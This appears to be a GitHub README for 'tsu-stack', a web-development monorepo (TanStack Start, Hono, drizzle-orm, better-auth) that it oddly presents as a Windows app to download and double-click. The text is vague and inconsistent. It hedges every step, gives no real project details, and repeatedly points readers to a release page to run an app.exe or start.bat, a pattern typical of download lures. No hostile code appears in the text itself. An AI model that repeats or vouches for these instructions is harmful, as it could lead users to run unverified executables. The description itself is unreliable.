# 🧩 tsu-stack - Run a full app with less setup

[![Download tsu-stack](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Aileeafraid516/tsu-stack/releases)

## 📦 What this is

tsu-stack is a ready-to-run Windows app built from a Vite Plus and TanStack Start monorepo. It brings the app, the API, sign-in, database tools, and translation support into one project.  
It is set up with Docker, so you can run it with less manual setup.

This project includes:

- a web app built with Vite and TanStack Start
- a server with Hono and oRPC
- database support with drizzle-orm
- user sign-in with better-auth
- built-in multilingual support with Paraglide.js
- a clean app layout based on Feature-Sliced Design
- UI pieces from shadcn/ui
- validation with Zod

## 🖥️ What you need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- a modern web browser
- Docker Desktop if the release uses containers
- enough free disk space for the app and its data
- a stable internet connection for the first setup

If the release includes a direct Windows file, you can download and run it.  
If the release includes packaged app files, use the release page and follow the steps for that package.

## ⬇️ Download tsu-stack

Use the release page here:

[Visit the tsu-stack release page](https://github.com/Aileeafraid516/tsu-stack/releases)

## 🚀 Install on Windows

1. Open the release page in your browser.
2. Find the latest release at the top.
3. Download the Windows file or release package shown there.
4. If the file is a ZIP archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. If you see an `.exe` file, double-click it to start the app.
7. If you see a Docker file or a `docker-compose.yml` file, install Docker Desktop first.
8. Start Docker Desktop and wait until it shows that it is ready.
9. Open the app folder in File Explorer.
10. Double-click the provided start file, or run the Docker command shown in the release notes.
11. Wait for the app to finish starting.
12. Open your browser and go to the local address shown by the app, such as `http://localhost:3000`.

## 🐳 Run with Docker

Some releases may use Docker for setup. This keeps the app and its services in one place.

1. Install Docker Desktop on Windows.
2. Start Docker Desktop.
3. Open the downloaded project folder.
4. Find the `docker-compose.yml` file.
5. Open a terminal in that folder.
6. Run the compose command from the release notes.
7. Wait for Docker to build or pull the images.
8. Open the local address printed in the terminal.

Common Docker commands:

- `docker compose up -d` to start the app in the background
- `docker compose down` to stop the app
- `docker compose logs -f` to view live logs

## 🔐 First-time sign in

If the app uses a sign-in screen, follow the steps shown in the interface.

1. Open the app in your browser.
2. Choose the sign-in option.
3. Enter your email and password.
4. If the app asks you to create an account, fill in the form.
5. Confirm your account if the app asks for email verification.
6. Sign in again after setup finishes.

The app uses better-auth for account handling, so the sign-in flow may include:

- email and password login
- account creation
- password reset
- session checks

## 🗄️ Database setup

tsu-stack uses drizzle-orm for database work. In most releases, the database setup is included with the app, but some versions may ask you to create local data files or connect to a database service.

If the release needs a database:

1. Start the app first.
2. Open the setup file or config shown in the release notes.
3. Add the database path, name, or connection string.
4. Save the file.
5. Restart the app.

If the release uses SQLite, the app may create the data file on its own.  
If the release uses another database, the release page should show the connection details needed for that version.

## 🌐 Language support

tsu-stack includes Paraglide.js for language support.

This means the app can show text in more than one language. If a language switcher appears in the app:

1. Open the app.
2. Find the language menu.
3. Choose your language.
4. The app updates the text you see.

## 🧭 App layout

The project uses Feature-Sliced Design, which helps keep the app parts in clear groups. For you, this means the app should feel organized and easier to use.

You may see areas like:

- home
- sign in
- settings
- profile
- admin tools
- data views
- API-connected screens

## 🧩 Main parts inside the stack

This project brings several tools together:

- TanStack Start for the app shell and routing
- Vite Plus for fast app loading
- Hono for server routes
- oRPC for typed API calls
- drizzle-orm for database access
- better-auth for user accounts
- Paraglide.js for translations
- shadcn/ui for interface components
- Zod for input checks

You do not need to set up each part by hand if you are using the release package. The goal is to give you one download and one setup path.

## 🛠️ Common tasks

### Start the app
- Open the app file or run the Docker command from the release page

### Stop the app
- Close the window, or use `docker compose down`

### Open the app again
- Double-click the app file, or start Docker Desktop and run the app command

### Check if it is running
- Look for a browser tab that opens
- Check the terminal for a local address like `localhost`

### Update to a new version
- Go back to the release page
- Download the newer release
- Replace the old files if the release notes say to do that

## 🔍 If something does not work

If the app does not start:

- make sure Docker Desktop is running
- check that you downloaded the full release file
- unzip the package before opening files inside it
- try running the app again after a restart
- confirm that your browser is up to date

If the page does not open:

- check the local address in the terminal
- try `http://localhost:3000`
- try `http://localhost:4173`
- wait a few more seconds if the app is still starting

If sign in fails:

- check your email and password
- confirm that your account was created
- try a password reset if that option appears

## 📁 Typical release files

A release may include files such as:

- `README.txt`
- `docker-compose.yml`
- `.env.example`
- `start.bat`
- `app.exe`
- `data/`
- `migrations/`

If you see a `start.bat` file, double-click it.  
If you see an `app.exe` file, double-click it.  
If you see a Docker compose file, use Docker Desktop and start the stack from that folder

## 🔧 Optional local settings

Some builds may let you change a few settings:

- app port
- database path
- API base URL
- language default
- auth settings

You can usually find these in a `.env` file or a settings file near the app files. Change only what the release notes ask you to change.

## 📚 What the topics mean

The repository topics point to the tools used in the stack:

- monorepo: one project with several parts
- docker and docker-compose: container-based setup
- drizzle-orm: database access
- feature-sliced-design and fsd: app structure
- hono: web server routes
- nitro: server runtime
- orpc: API layer
- paraglide-js: translations
- shadcn-ui: UI parts
- tanstack-router and tanstack-start: app routing and app shell
- vite and vite-plus: frontend build tools
- zod: input validation
- better-auth: user accounts

## 📄 Release page checklist

Before you download, check that the release page shows:

- the newest version
- a Windows download file or a ZIP package
- setup steps if Docker is required
- any extra files for first launch
- the local address to open after startup

## 🖱️ Use the release page now

[Open the tsu-stack release page](https://github.com/Aileeafraid516/tsu-stack/releases)

## 🧰 Basic use after setup

After the app starts, you can usually:

- sign in
- view the main dashboard
- open settings
- change language
- connect data
- use the built-in screens for the app workflow

If the app stores data locally, keep the files in the same folder so the app can find them on the next launch

## 🧪 System behavior you may see

When the app starts, it may:

- open a terminal window
- take a short time to load
- build files the first time
- create local data folders
- show a browser tab with the app

This is normal for a first launch of a Vite and Docker-based project